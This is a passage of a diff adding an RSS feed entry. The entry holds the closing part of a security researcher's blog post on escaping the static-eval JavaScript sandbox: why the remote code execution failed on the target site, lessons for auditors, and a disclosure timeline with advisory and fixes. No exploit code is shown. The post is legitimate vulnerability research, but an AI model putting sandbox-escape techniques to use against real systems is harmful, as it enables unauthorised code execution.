+be able to avoid. This is &lt;strong&gt;just a bug in the library&lt;/strong&gt;, that makes it fail
+when defining functions (both benign and malicious) inside filter expressions.
+And because of this, my bypass technique won't work with this library.&lt;/p&gt;
+&lt;p&gt;Just because of the horrible decision of naming a variable &lt;code&gt;@&lt;/code&gt; in a library
+that is used mainly in JS, where &lt;code&gt;@&lt;/code&gt; isn't a valid variable name in JS, I
+wasn't able to exploit the RCE in the site and obtain a 4-digit bounty. Why
+wouldn't the author name it &lt;code&gt;_&lt;/code&gt; (that is a valid variable name), &lt;code&gt;document&lt;/code&gt; or
+&lt;code&gt;joseph&lt;/code&gt;!!  This time, I'll have to settle only with having discovered a great
+vulnerability in the library, and having learned a lot about JavaScript.&lt;/p&gt;
+&lt;h2&gt;Conclusions&lt;/h2&gt;
+&lt;p&gt;Even if I wasn't able to get the bounty I was expecting, I had a really good
+time playing with this library. And I used the concepts I learned to bypass a
+different kind of restricted JS environments, this time getting an economic
+reward.  I hope to publish this other research soon.&lt;/p&gt;
+&lt;p&gt;I want to mention again the &lt;a href="https://maustin.net/articles/2017-10/static_eval"&gt;great previous work done by Matt Austin about
+static-eval&lt;/a&gt;. Without this material, maybe I wouldn't have
+found this new vulnerability.&lt;/p&gt;
+&lt;p&gt;As a general recommendation when testing a system, it is always tempting to
+replicate and isolate one feature of it in a local environment we control, so
+we can play with it more freely. In my case, I made a Docker instance with the
+static-eval library to try bypassing the sandbox. My problem was that I only
+used this instance during the whole research, without corroborating that what I
+was doing was valid in the real site. If I had done this before, maybe I would
+have noticed this wasn't going to work and I'd have moved to something else.
+The lesson learned is that you shouldn't abstract so much over a whole system,
+and that you should continuously test what you found in the real system, instead
+of doing it just at the end of your research.&lt;/p&gt;
+&lt;p&gt;Finally, if you're auditing a site that has a similar system that evaluates
+user-controlled expressions inside a sandbox, I highly recommend you to play
+with it a considerable amount of time. It would be strange to find a sandbox
+system free of vulnerabilities, specially if it executes dynamic,
+fully-featured programming languages like JavaScript, Python or Ruby. And when
+you find this kind of sandbox bypass vulns, they usually have a critical impact
+in the application that contains them.&lt;/p&gt;
+&lt;p&gt;I hope you enjoyed this post. Greetings!&lt;/p&gt;
+&lt;h2&gt;Extra: Cronology of the vuln&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;01/02/19 - Report of the vulnerability submitted both to the NodeJS
+  security team and to the static-eval mantainer. You can read the
+  original report &lt;a href="https://licenciaparahackear.github.io/posts/static-eval-sandbox-escape-original-writeup/"&gt;here&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;01/03/19 - The NodeJS security team replicated the bug. The told me
+  they were going to contact the library mantainer and publish an advisory
+  if he didn't respond to the report&lt;/li&gt;
+&lt;li&gt;02/14/19 - &lt;a href="https://www.npmjs.com/advisories/758"&gt;Advisory officially published in the nmpjs site&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;02/15/19 - &lt;a href="https://github.com/browserify/static-eval/pull/21"&gt;The library was fixed&lt;/a&gt; and a new version of it
+  was released&lt;/li&gt;
+&lt;li&gt;02/18/19 - The library's README file was updated to add a &lt;a href="https://github.com/browserify/static-eval/pull/22/files"&gt;disclaimer
+  saying that the library shouldn't be used as a sandbox&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;02/26/19 - &lt;a href="https://github.com/browserify/static-eval/pull/23"&gt;A new fix&lt;/a&gt; was applied to the library because my
+  original fix had a bug and static-eval was still vulnerable&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="footnote"&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id="fn-ecma-disclaimer"&gt;
+&lt;p&gt;It's worth noting that this is a pretty vague and incorrect
+definition of what ECMAScript is. My indifference to the JavaScript ecosystem
+makes me don't even bother in finding a more correct definition. &lt;a class="footnote-backref" href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/#fnref-ecma-disclaimer" title="Jump back to footnote 1 in the text"&gt;↩&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;&lt;/div&gt;</description><category>bug bounty</category><category>bypass</category><category>javascript</category><category>jsonpath</category><category>nodejs</category><category>remote code execution</category><category>sandbox</category><guid>https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/</guid><pubDate>Fri, 01 Mar 2019 15:01:15 GMT</pubDate></item></channel></rss>
